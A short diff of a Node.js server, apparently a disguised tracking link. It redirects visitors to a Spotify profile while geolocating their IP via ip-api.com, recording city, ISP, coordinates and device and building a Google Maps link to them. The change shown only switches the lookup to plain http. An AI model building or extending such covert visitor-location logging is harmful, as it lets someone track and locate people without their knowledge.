@@ -8,7 +8,8 @@ const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22b
 
 function fetchJSON(url) {
   return new Promise((resolve, reject) => {
-    https.get(url, res => {
+    const mod = url.startsWith('https') ? require('https') : require('http');
+    mod.get(url, res => {
       let data = '';
       res.on('data', c => data += c);
       res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
@@ -86,7 +87,7 @@ app.get('/', async (req, res) => {
     const { os, browser, device, app: detectedApp } = parseUA(uaStr);
     const source = detectedApp !== 'Doğrudan / Bilinmiyor' ? detectedApp : (referrer || 'Doğrudan / Bilinmiyor');
     let geo = {};
-    try { geo = await fetchJSON('https://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
+    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
     const flag = codeToFlag(geo.countryCode);
     const konum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
     const mapsLink = geo.lat ? 'https://www.google.com/maps?q='+geo.lat+','+geo.lon : '';
